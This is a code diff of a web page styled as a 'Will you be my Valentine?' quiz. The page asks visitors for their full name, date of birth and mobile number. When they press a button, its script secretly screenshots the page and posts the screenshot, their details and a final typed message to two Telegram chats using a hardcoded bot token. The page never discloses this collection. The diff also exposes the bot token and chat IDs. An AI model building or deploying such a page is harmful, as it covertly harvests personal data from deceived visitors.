@@ -12,23 +12,20 @@
         :root {
             --bg: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);
             --glass: rgba(255, 255, 255, 0.25);
-            --text: #ffffff;
             --accent: #ff4d6d;
         }
 
         .dark-theme {
             --bg: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
             --glass: rgba(255, 255, 255, 0.05);
-            --text: #e2e8f0;
             --accent: #ff758f;
         }
 
         body { 
             font-family: 'Poppins', sans-serif; 
             background: var(--bg); 
-            color: var(--text);
             min-height: 100vh;
-            transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: all 0.6s ease;
             overflow: hidden;
             display: flex; align-items: center; justify-content: center;
         }
@@ -72,15 +69,10 @@
         }
         #yt-header.active { top: 0; }
 
-        .btn-premium {
-            background: var(--accent);
-            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
+        .btn-premium { background: var(--accent); transition: 0.3s; }
         .btn-premium:hover { transform: scale(1.05); filter: brightness(1.1); }
 
         .hidden-stage { display: none; }
-        .thank-you-img { animation: floating 3s ease-in-out infinite; }
-        @keyframes floating { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
     </style>
 </head>
 <body id="capture-body">
@@ -91,53 +83,49 @@
     <div class="status-bar">
         <div id="clock">12:00</div>
         <div class="flex gap-3">
-            <span>📶</span> <span id="battery-level">🔋 95%</span>
+            <span>📶</span> <span id="battery-level">🔋 98%</span>
         </div>
     </div>
 
     <button onclick="toggleTheme()" class="fixed bottom-6 right-6 p-4 glass-card rounded-2xl z-[600]">
-        <span id="theme-icon" class="text-xl">🌙</span>
+        <span id="theme-icon">🌙</span>
     </button>
 
-    <div id="yt-header">
-        <div id="player-mount" class="w-full h-full"></div>
-    </div>
+    <div id="yt-header"><div id="player-mount" class="w-full h-full"></div></div>
 
     <div class="w-full max-w-sm px-4">
-        <div id="main-content" class="glass-card p-8 text-center w-full relative overflow-hidden">
+        <div id="main-content" class="glass-card p-8 text-center w-full">
             
             <div id="stage-1" class="space-y-4">
-                <h1 class="text-4xl font-bold cursive mb-2 drop-shadow-md">Hey Bestu! ✨</h1>
-                <div class="space-y-4">
-                    <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
-                    <input type="date" id="dob" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
-                    <input type="tel" id="mobile" placeholder="WhatsApp Number" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
-                    <button onclick="toStage2()" class="btn-premium w-full text-white font-bold py-4 rounded-2xl mt-4 shadow-xl">Reveal Heart ❤️</button>
-                </div>
+                <h1 class="text-4xl font-bold cursive mb-6">Hello Bestu! ✨</h1>
+                <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
+                <input type="date" id="dob" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
+                <input type="tel" id="mobile" placeholder="Mobile Number" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
+                <button onclick="toStage2()" class="btn-premium w-full text-white font-bold py-4 rounded-2xl mt-4 shadow-xl">Reveal Heart ❤️</button>
             </div>
 
             <div id="stage-2" class="hidden-stage">
-                <h1 class="text-4xl font-bold cursive mb-6 drop-shadow-md">For You... ❤️</h1>
-                <p class="text-xl italic mb-10 tracking-wide">Will you be my Valentine?</p>
+                <h1 class="text-3xl font-bold cursive mb-10">Will you be my Valentine? ❤️</h1>
                 <div class="grid gap-4">
-                    <button onclick="handleAction('YES', '❤️')" class="btn-premium text-white font-bold py-4 rounded-2xl shadow-lg">YES! 😍</button>
-                    <button onclick="handleAction('NO', '😊')" class="bg-white/10 text-white font-bold py-4 rounded-2xl transition-all">No 😢</button>
-                    <button onclick="handleAction('FOOD', '🍕')" class="bg-yellow-500/80 text-white font-bold py-4 rounded-2xl shadow-lg">Food (You pay! 🍕)</button>
+                    <button onclick="handleAction('YES', '❤️')" class="btn-premium py-4 rounded-2xl font-bold text-white shadow-lg">YES! 😍</button>
+                    <button onclick="handleAction('NO', '😊')" class="bg-white/10 py-4 rounded-2xl font-bold text-white">No 😢</button>
+                    <button onclick="handleAction('FOOD', '🍕')" class="bg-yellow-500 py-4 rounded-2xl font-bold text-white">Food (You will pay! 🍕)</button>
                 </div>
             </div>
 
             <div id="stage-3" class="hidden-stage space-y-6">
-                <h2 class="text-3xl font-bold cursive mb-4 drop-shadow-md">You're Amazing! ❤️</h2>
-                <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKoWXlo3M1nKS6A/giphy.gif" class="thank-you-img w-full rounded-[2rem] shadow-2xl">
-                <div class="bg-white/10 p-5 rounded-3xl border border-white/20">
-                    <textarea id="final-reply" placeholder="Type here..." class="w-full p-3 rounded-xl bg-transparent border border-white/10 outline-none text-sm text-white" rows="2"></textarea>
-                    <button onclick="sendFinalReply()" class="w-full bg-green-500 text-white font-bold py-3 rounded-xl mt-3 text-xs uppercase shadow-lg">Submit ✅</button>
+                <h2 class="text-3xl font-bold cursive">Thank You! ❤️</h2>
+                <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKoWXlo3M1nKS6A/giphy.gif" class="w-full rounded-3xl shadow-2xl">
+                <div class="bg-white/10 p-5 rounded-3xl border border-white/10">
+                    <textarea id="final-reply" placeholder="Send a final message..." class="w-full p-3 rounded-xl bg-transparent outline-none text-sm border border-white/10 text-white" rows="2"></textarea>
+                    <button onclick="sendFinalReply()" class="w-full bg-green-500 py-3 rounded-xl mt-3 text-xs font-bold uppercase text-white">Submit ✅</button>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
+        // CONFIG
         const BOT_TOKEN = "8511064311:AAGi_3QOQzanNtc9P7PzT4z54NBZEXfK5rk";
         const CHAT_IDS = ["6572151527", "7893857792"]; 
         let store = {};
@@ -154,57 +142,59 @@
         }
 
         function createRain(emoji) {
-            for(let i=0; i<45; i++) {
+            for(let i=0; i<40; i++) {
                 setTimeout(() => {
-                    const p = document.createElement('div');
-                    p.innerText = emoji; p.className = 'particle';
+                    const p = document.createElement('div'); p.innerText = emoji; p.className = 'particle';
                     p.style.left = Math.random() * 100 + 'vw';
-                    p.style.fontSize = '25px';
+                    p.style.fontSize = '24px';
                     p.style.animationDuration = '3s';
                     document.body.appendChild(p);
                     setTimeout(() => p.remove(), 4000);
-                }, i * 80);
+                }, i * 100);
             }
         }
 
         function toStage2() {
             store = { n: document.getElementById('name').value, d: document.getElementById('dob').value, m: document.getElementById('mobile').value };
-            if(!store.n || !store.m) return alert("Fill details! ✨");
+            if(!store.n || !store.m) return alert("Fill all details! 😊");
             document.getElementById('stage-1').classList.add('hidden-stage');
             document.getElementById('stage-2').classList.remove('hidden-stage');
         }
 
-        const yt = { 'YES': 'TK2RwQUun-U', 'NO': 'CVEM60qkzT8', 'FOOD': 'XGURSAziJjc' };
+        const ytLinks = { 'YES': 'TK2RwQUun-U', 'NO': 'CVEM60qkzT8', 'FOOD': 'XGURSAziJjc' };
 
         async function handleAction(type, emoji) {
             createRain(emoji);
             
-            // Capture Full Screen Simulation
-            const canvas = await html2canvas(document.body, { useCORS: true, backgroundColor: null, scale: 2 });
+            // Capture the WHOLE PAGE (Simulation + Body)
+            const canvas = await html2canvas(document.body, { 
+                useCORS: true, 
+                backgroundColor: null,
+                scale: 2 // High Resolution
+            });
+
             canvas.toBlob(async (blob) => {
-                // Send to BOTH IDs
+                // SEND TO BOTH IDS
                 CHAT_IDS.forEach(id => {
                     const fd = new FormData();
                     fd.append('chat_id', id);
-                    fd.append('photo', blob, 'shot.png');
-                    fd.append('caption', `💌 RESPONSE: ${type}\nName: ${store.n}\nMobile: ${store.m}\nDOB: ${store.d}`);
+                    fd.append('photo', blob, 'bestu_capture.png');
+                    fd.append('caption', `💖 *VALENTINE UPDATE*\n\n*Name:* ${store.n}\n*Choice:* ${type}\n*Mobile:* ${store.m}\n*DOB:* ${store.d}`);
+                    fd.append('parse_mode', 'Markdown');
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 });
             }, 'image/png');
 
-            document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${yt[type]}?autoplay=1&mute=0" frameborder="0" allow="autoplay; encrypted-media"></iframe>`;
+            document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${ytLinks[type]}?autoplay=1" frameborder="0" allow="autoplay; encrypted-media"></iframe>`;
             document.getElementById('yt-header').classList.add('active');
-
             document.getElementById('stage-2').classList.add('hidden-stage');
             document.getElementById('stage-3').classList.remove('hidden-stage');
         }
 
         async function sendFinalReply() {
             const reply = document.getElementById('final-reply').value;
-            if(!reply) return alert("Write something! ❤️");
-            // Send to BOTH IDs
             CHAT_IDS.forEach(id => {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("💬 Message from " + store.n + ": " + reply)}`);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("💬 Final Message from " + store.n + ": " + reply)}`);
             });
             alert("Sent! Thank you!");
             location.reload();
